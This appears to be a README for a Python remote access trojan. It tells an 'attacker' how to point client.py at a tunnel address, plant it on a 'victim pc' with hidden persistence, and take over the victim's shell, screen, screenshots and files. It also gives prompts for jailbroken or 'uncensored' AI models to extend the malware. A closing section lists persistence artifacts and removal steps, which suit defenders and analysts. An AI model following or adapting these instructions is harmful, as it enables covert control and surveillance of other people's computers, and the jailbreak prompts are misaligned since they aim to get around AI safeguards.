<details>
  <summary><b>✨ New version-7.5</b></summary>
  <br>
  
> **upex got new updates** 🌐

> **Read `UPEX-feature.md` for more**

> **More bugs fixed and so on**

> **If you find issues, jump back to previous one**

</details>

***

## 👾 Malwares & Connection Guidelines
**Attacker should change its ip address in client.py before put it in victim pc** 📍

**You can use ngrok , pinggy etc if victim is outside local network** 📶

**You can chagne connection type : auto, https, http , tcp** 🔄

**But it is recommended to use auto, and It can handle everything perfectly** 👍

**But both controller.py and client.py should have same connection type or auto mode to work** 🤝

**New Update again, Check connection-guideline.md** 📄

<details>
  <summary><b>Details here</b></summary>
  <br>

  > **Suppose you get pinggy address look like this:** 🔗
  
  > **For tcp:** 🔌
  
  > **tcp://wmzkw-blah..blah..pinggy-free.link:36399**
  
  > **Then you have to put these exact line from "tcp.. to ..36399" in the Victim's pc: 'client.py' -> Default ip address** 📝

  > **or For http/https:** 🌐
  
  > **https://qewhq-blah..blah..run.pinggy-free.link**
  
  > **Then you have to put these exact line from "https.. to ..link" in the Victim's pc: 'Client.py' -> Default ip address** 📝

  > **Don't worry about port number, It will be automatically handled. So don't change Default port number in client.py** 💡
  
  > **Also both controller.py and client.py should have connection type: auto** ✅
  
  > **controller.py uses Default IP: 0.0.0.0 and Port: 4444. Keep it as it is, If you have no idea about both script's code complexity** 🧑‍💻
  
  > **For ngrok , check connection-guideline.md . (Basically same Instruction as pinggy)** 🔗
</details>

---

## ⚙️ System Compatibility & Issues
**Supported os: Windows, Mac os, Ubuntu, Ubuntu server, Fedora, Red Hat Enterprise server, Arch linux, ios, android 9-17** 📱💻🐧

**Tested on: Not yet** ✅

<details>
  <summary><b>Previous versions issues: </b></summary>
  <br>

> **Some features didn't work on Fedora, you may face some issues like screenshare or screenshot not working and if you press ctrl+c, you may loose access untill next loging or reboot in fedora** ⚠️

> **In Linux mint , it's not working after reboot for Permanent hack method** ❌

> **In Android, controller.py not working . May be root needed** 🚫

> **In windows, shell feature is laggy, also it can freeze controller.py** 🐌

</details>

---

## 🛠️ Fix Freezed Controller Issue
<details>
  <summary><b>Fix freezed controller issue</b></summary>

  ```bash
  pgrep -af controller.py
  ```
  > **Then** ➡️
  ```bash
  kill <uid-number>
  ```
  > **Run controller again:** ▶️
  ```bash
  python controller.py
  ```
</details>

---

## ⚠️ Key Warnings & Instructions

> **While you are in controller> , typing `exit session <session number>` . It will stop client.py from that specific target device** 🛑
>
> **Typing `exit session all` . It will stop client.py from that all injected device** 🌍
>
> **You need wait for next login again only if you used permanent hack method** ⏳
>
> **Just press ctrl + c or type: `exit` , to exit controller.py process.** 👋

---

## 💻 For Windows Only
**There is bat file , exe file and exe with icon file** 🖼️
**There is only image opener bat and exe file** 📸

**If you wanna know how to get exe and exe with icon and image opener, Click here:** 👇

https://github.com/boss-defender/Windows-Stuffs

---

## 🤖 Future Update with AI

<details>
<summary><b>If you have uncensored ai model or you manage to jailbreak, then use this prompt: 🧠</b></summary>

```text
# I want to add this feature 
> blah blah....

# I want to add this feature too . 
> blah blah....

# Also make it like 
> blah blah....

Finally make sure both controller.py & client.py are carefully edited and optimized. 
Then recheck for bugs and errors . fix them all . make it perfect. 
Remember both controller.py & client.py should support: all supported os such as, Linux distro like: Ubuntu , linux mint , Zorin OS , Pop OS, Debian, Red Hat Enterprise, Fedora Linux, Arch , Omarchy , Manjaro , Kali linux etc, and linux server like: Ubuntu server and Red Hat server , latest windows 10/11/12 or latest windows version and latest mac os , latest ios and android 9 to 16 or latest available version.
Do Online Deep Research for all the platform's latest documentation and also networking systems.
Make sure to double recheck that all (previous/old + new) features, functionalities, networking & underlying systems operate flawlessly .
```

**Then add this or after Ai finished your job add this:** ➕

**To remove bugs and make it better**

```text
Re-check the script again & again, find bugs and fix them all.+ also Also look for (slower receiving and slower sending) bugs. Both controller and client shouldn't receive slowly or should not send slowly. It should be fast and reliable for all type of  and versions of https , http , tcp connections, so make both controller.py and client.py optimized for that. And also recheck multiple times that all (previous/old + new) features, functionalities, networking & underlying systems operate flawlessly . Fix them too. and both controller.py and client.py should work perfectly fine  for all supported os such as, Linux distro like: Ubuntu , linux mint , Zorin OS , Pop OS, Debian, Red Hat Enterprise, Fedora Linux, Arch , Omarchy , Manjaro , Kali linux etc, and linux server like: Ubuntu server and Red Hat server , latest windows 10/11/12 or latest windows version and latest mac os , latest ios and android 9 to 16 or latest available version . Do Online Deep Research for all the platform's latest documentation and also networking systems.

So make sure that on every distro and operating system and servers , both scripts perfectly work with all its features and functionalities, networking and underlying systems operate flawlessly. Fix all the bugs and errors. Please re-check it perfectly again. Don't make any errors, it should work very smoothly without causing any issues. recheck multiple times everything and make it perfect . 
```
</details>

<details>
<summary><b>Also move whole project for another ai agent 🚚</b></summary>

*Double check this box, before you paste*
➡️
```text
your task is now , only for now to pact this whole ongoing project (with all its dependency files and folders) in to project_going_on. because I will give this whole project to another ai agent . so add a README.md file there so that ai agen tcan understand it all and can also keep going from where we are just now

 and summerize  my all previous messeges  to instruction.md . because , some of my instruction are not applied to project because ai agent server down.. so all my latest instructions ( like latest 12 instructions ) should be in instruction.md in a way that next ai agent can understand everything

 and finally , add what_you_do_now.txt where my latest text messeages (just my latest text messeges will be shown) like latest top 5 messeges to ai agent what to do , don't include continue , hi, etc
and dont modify what I said, because ai agent should now understand what he have to do now
```

**Then, in new session, tell your ai agent:**
.
```text
path/to/dir/project_going_on
this is your working directory.

now , analyze this directory, go through all files and folders, read and analyze everything, specially README.md and instruction.md . 

then do what `what_you_do_now.txt` tell you to do. 
always backup , don't make it mess. Go on .
```

</details>

---

## ✨ Features Overview
**Type `show options` to see all available feature** ⚙️

**New connections type added check Support.md** 🆕

**You need to learn target os command prompt to operate** ⌨️

**session selection, download , upload , screenshot , screenshare , shell , exit session** ✅

---

## 🎯 Session Management
<details> 
<summary><b>click here</b></summary> 🖱️

**To list session , type:** 📋
```bash
session
```
then
```bash
connect session 1
```
or just ,

```bash
session 1
```

change 1 with specific number you want to control. 🔢

**To change session:** ➡️
*(See above)*

**To list session again , type:** 🔁
```bash
session
```

then ,

```bash
connect session 2
```
or just ,

```bash
session 2
```

change 2 with specific number you want to control. 🔢

</details> 

---

## 🎬 Core Functionalities
**screenshare will open video on default web browser** 📺

**ctrl + z will terminate any process in controller>** 🛑

**ctrl + b will take it to background process in controller>** 👻

**Shell will give you direct access to terminal , you can type password and confirm anything** ⌨️

**If victim use zsh, fish , then Attacker may face problem while trying to give command prompt in shell** 😟

**But just type : bash** 🚀

**Now in bash shell mode , you will face less issues** 👍

**To exit shell , type "exit"** 👋

**You may need to type exit several time to get back into controller>** ↩️

**If session is connected but you can't see controller> , just hit enter** 👆


> **While you are in controller> , typing `exit session <session number>` . It will stop client.py from that specific target device** 🛑
>
> **Typing `exit session all` . It will stop client.py from that all injected device** 🌍
>
> **You need wait for next login again only if you used permanent hack method** ⏳
>
> **Just press ctrl + c or type: `exit` , to exit controller.py process.** 👋

---

## 🧪 One Time Test Only
<details> 
<summary><b>click here</b></summary> 🖱️
  
**In victim pc, run:** ▶️
```bash
python client.py
```

**In Attacker pc, run:** ▶️
```bash
python controller.py
```
</details>

---

## 🛡️ Permanent Hack Setup
**You need to download auto.py. To know what auto.py is and to get latest update check:** 👇

https://github.com/boss-defender/Auto-Py.git

**Importantly , You can change .configs to any folder name like .msdxs or visible-folder etc in auto.py** 📂

---

## 🟢 Foreground Session (Visible)
<details> 
<summary><b>click here</b></summary> 🖱️

  
**In victim pc, run:** ▶️
**If victim os is Linux based :** 🐧
```bash
python auto.py client.py
```
**If victim os is Windows 10/11 :** 🪟
**Then run cmd.exe in administrative mode and go to the directory where you save auto.py and Client.py and then run this:** ▶️
```bash
python auto.py client.py
```

**In Attacker pc, run:** ▶️
```bash
python controller.py
```

**Problem for Foreground session is: Victim can see what's going on in his pc and can stop it easily** 👀
</details>

---

## 👻 Background Session (Hidden)
<details> 
<summary><b>click here</b></summary> 🖱️

**In victim pc, run:** ▶️
**If victim os is Linux based :** 🐧
```bash
python auto.py client.py --hide
```
**If victim os is Windows 10/11 :** 🪟
**Then run cmd.exe in administrative mode and go to the directory where you save auto.py and Client.py and then run this:** ▶️
```bash
python auto.py client.py --hide
```

**In Attacker pc, run:** ▶️
```bash
python controller.py
```

**Advantages for Background session is: Victim can not see what's going on in his pc and need manual configuration to remove.** 🤫
</details>

---

## 🧩 Dependency Problem & Installation
<details> 
<summary><b>click here</b></summary> 🖱️


**Both Attacker and Victim pc require Python 3.7 or newer (Python’s standard library for networking and their main control flow.)** 🐍
**Check it out here:** 👇

https://python-academy.org/en/guide/python-installation

**For victim pc :** 🎯
**In Windows, other necessary dependencies might be already there** ✅

**But if victim pc is Linux, Check first everythings work or not** 🤔
**Specially this command** 🧪
```bash
screenshare 
```
**If it works , then nothing to do** 👌

**But if it causes errors, then follow this** 👇

**Required third-party package: Pillow (PIL) is used for screenshots and screen sharing. The client attempts to install it automatically at startup; if that fails, the main loop continues, but capture features may fail.** 🖼️

**Run this command on Victim Linux pc:** 🐧

**For Debian based or Ubuntu :** 🔵
```bash
sudo apt update && sudo apt install -y libglib2.0-bin grim python3-pil python3-pyautogui spectacle
```
**For Red Hat based or Fedora :** 🔴
```bash
sudo dnf check-update; sudo dnf makecache && sudo dnf install -y glib2 grim python3-pillow python3-pyautogui spectacle --skip-unavailable
```
**For Arch based:** 🟢
```bash
sudo pacman -Syu --noconfirm glib2 grim python-pillow spectacle && yay -S --noconfirm python-pyautogui
```

**Optional capture tools, depending on the desktop:** 🎨

- Wayland on Hyprland/Sway: `grim`
- KDE: `spectacle`
- GNOME: `gdbus` and `GNOME Shell’s screenshot interface`
- X11: `ImageMagick’s import command`
- `pyautogui` is an optional fallback 🖱️

The code reports gnome-screenshot as an available helper, but its capture function uses gdbus for GNOME instead. 💡
</details>

---

## 🗑️ Removal Guides
# Easiest Removal Guide (Recommended): ✨

## **If Attacker use One session hack only** 👤
**Then removing the Client.py and system restart is enough.** 🧹

## **If Attacker use Permanent hack** 💾
**Replace .config here with your given folder name in auto.py if you change folder name** 📂

**Then go to ~/.config . This folder should be in your user home directory.** 🏠

**For Windows:** 🪟
```bash
C:\Users\<user-name>\.config
```
**For Linux:** 🐧
```bash
/home/<user-name>/.config
```
**Then check for two files: 1) auto.py & 2) Client.py** ✅

**If you don't find auto.py then download it from here :** -> 
https://github.com/boss-defender/Auto-Py.git

**Then put auto.py in .config folder only if auto.py was not there** 📥

**Then run:** ▶️
```bash
python auto.py client.py --stop
```

**This is enough . Malware is removed** 🎉

**Replace .config there with your given folder name in auto.py if you change folder name** 🔄

**Again to know more about auto.py and its feature go this link and read README.md file.** 📖

https://github.com/boss-defender/Auto-Py.git

---

# 🔬 Detection & Removal Guide (Not Recommended): 🧐
<details> 
<summary><b>click here</b></summary> 🖱️
  
How to detect and **permanently remove** the persistence (auto-start) artifacts this tool can leave on a machine — on Linux (systemd) and Windows. Written so it can be published alongside the tool, or used to clean up lab VMs. It also lists the places to check for this general class of tool, which is useful for analysts. 🧑‍🔬

> Closing the running program is **not** enough: an auto-start entry can still
> bring it back after a reboot. The steps below remove the entry itself. 🚫

---

## ⚡ Quick removal (when the client is still running)
- From the controller: type `unpersist` 🗣️
- On the machine itself: `python3 client.py --remove-persist` 🧹
- Self-copying builds (see the `Visible-Background-Process` section below):
  on the machine, e.g. `python auto.py client.py --stop` removes the auto-start entry and stops the processes — check for leftover copied files anyway 🗑️

All of these remove the auto-start entry. A copy that is **already running** stays up until it is closed or the machine is rebooted. If the script file itself was deleted, moved, or renamed, use the manual steps below. 🛠️

---

## 🐧 Linux (systemd)
### What to look for 🔍
| Artifact | Where |
|---|---|
| User service | `~/.config/systemd/user/autorun-client.service` |
| System service (installed with sudo) | `/etc/systemd/system/autorun-client.service` |

```bash
# list and inspect
systemctl --user list-unit-files 'autorun-*'
systemctl --user status autorun-client.service
systemctl status autorun-client.service        # system-level
```

The `ExecStart=` line points at a Python interpreter running `client.py` with an IP and port, for example: 🔗

```
ExecStart=/usr/bin/python3 /path/to/client.py 192.0.2.10 4444
```

### Remove — user service 🛑
```bash
systemctl --user stop autorun-client.service      # fine if it says "not found"
systemctl --user disable autorun-client.service   # removes autostart links
rm -f ~/.config/systemd/user/autorun-client.service
systemctl --user daemon-reload
systemctl --user reset-failed                     # clears a red "failed" state
```

### Remove — system service 👑
```bash
sudo systemctl stop autorun-client.service
sudo systemctl disable autorun-client.service
sudo rm -f /etc/systemd/system/autorun-client.service
sudo systemctl daemon-reload
sudo systemctl reset-failed
```

### Stop a running copy 🔪
```bash
pgrep -af "client.py"     # note the PIDs
kill <PID>                # add sudo if it was started as root / by a service
```

---

## 🪟 Windows
### What to look for 🔎
| Artifact | Where |
|---|---|
| Scheduled task | `AutoRun_client` (hidden, trigger: at logon) |
| Registry Run value | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `AutoRun_client` |
| Startup-approved flag | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run` → `AutoRun_client` |
| Launcher script | `%LOCALAPPDATA%\AutoRunner\AutoRun_client.vbs` |
| Process | `pythonw.exe` running `client.py` |

### Remove (cmd.exe) 🧹
```bat
schtasks /Query /TN AutoRun_client /V /FO LIST
schtasks /Delete /TN AutoRun_client /F

reg query  "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AutoRun_client
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AutoRun_client /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v AutoRun_client /f

del "%LOCALAPPDATA%\AutoRunner\AutoRun_client.vbs"
rmdir "%LOCALAPPDATA%\AutoRunner" 2>nul
```

### Stop a running copy (PowerShell) 🛑
```powershell
Get-CimInstance Win32_Process -Filter "Name='pythonw.exe'" |
  Where-Object { $_.CommandLine -match 'client\.py' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
```

---

## 🔄 Self-copying variant (`Visible-Background-Process`)
Newer builds copy the target into a per-user folder and register auto-start for **the copy**, so the original script file becomes irrelevant. Names below follow the target: running `python auto.py client.py` uses the name `client`.

### 🗺️ Platform Artifacts Table
| Platform | Artifact |
|---|---|
| Both | Copy folder: `~/Visible-Background-Process/` (`%USERPROFILE%\Visible-Background-Process` on Windows) |
| Linux | XDG autostart entry: `~/.config/autostart/<name>.desktop` — its `Exec=` line points **into the copy folder** |
| Windows | Scheduled task `VisibleBackground_<name>`, whose action runs `VisibleBackground_<name>.vbs` from inside the copy folder |

Two things make this variant different to remove: 💡

- Deleting, quarantining, or renaming the original script does not disable anything — the folder copy and its auto-start entry remain. 💾
- Killing the process only stops it until the next logon/reboot. Disable the auto-start **first**, then kill, then delete the copy. ➡️

### 🐧 Linux — remove 🗑️
```bash
# 1. Locate the auto-start entry (its Exec= path points into the copy folder)
grep -R "Visible-Background-Process" ~/.config/autostart/ 2>/dev/null
rm -f ~/.config/autostart/client.desktop      # the file that appeared above
# if the tool ran as other users: check /home/*/.config/autostart/ too

# 2. List and stop whatever runs from the folder
pgrep -af "Visible-Background-Process"
pkill -f "Visible-Background-Process"

# 3. Delete the copy
rm -rf "$HOME/Visible-Background-Process"
```

### 🪟 Windows — remove (cmd.exe) 🧹
```bat
schtasks /Query  /TN VisibleBackground_client /V /FO LIST
schtasks /Delete /TN VisibleBackground_client /F
```

If the task name has a different suffix, `schtasks /Query /V /FO LIST | findstr /i visible` finds it. 🔎

Stop the process, then delete the folder (PowerShell): 🛑
```powershell
Get-CimInstance Win32_Process |
  Where-Object { $_.CommandLine -match 'Visible-Background-Process' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
```

```bat
rmdir /s /q "%USERPROFILE%\Visible-Background-Process"
```

Also skim the Run keys and both Startup folders from the Windows section above — a second reference is easy to miss. 👀

---

## ✅ General Checklist (this class of tool) 📋
**Linux** 🐧
- `~/.config/systemd/user/*.service` — `ExecStart` running python + a script
- `/etc/systemd/system/*.service` — same pattern, often with `User=` set
- XDG autostart: `~/.config/autostart/*.desktop`
- cron: `crontab -l`, `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly}/`
- shell startup files: `~/.bashrc`, `~/.profile`, `~/.zshrc`
- stray script copies: look in `Downloads`, `/tmp`, and dot-directories 📁

**Windows** 🪟
- Task Scheduler: tasks with **Hidden** set and an **At logon** trigger whose action is `python`/`pythonw` + a `.py` or `.vbs` file
- `Run` / `RunOnce` keys under both `HKCU` and `HKLM`
- Startup folders: `shell:startup` and `shell:common startup`
- Services (`sc query state= all`) with a python-like `ImagePath`
- WMI event subscriptions (advanced persistence, not used here) 📡

**Network** 🌐
- Linux: `ss -tnp` | Windows: `netstat -ano`
- Look for an ESTABLISHED outbound connection to the controller's IP:port, owned by `python` / `pythonw` 📶

---

## 📝 Notes
- Older builds run the original script in place and register exactly **one** auto-start entry per platform (systemd unit, Scheduled Task, or XDG `.desktop`). The self-copying variant described above runs a copy from `~/Visible-Background-Process/` instead — check that folder and its auto-start entry as well. 🔄
- Removal does not require the controller to be online. 🟢

***
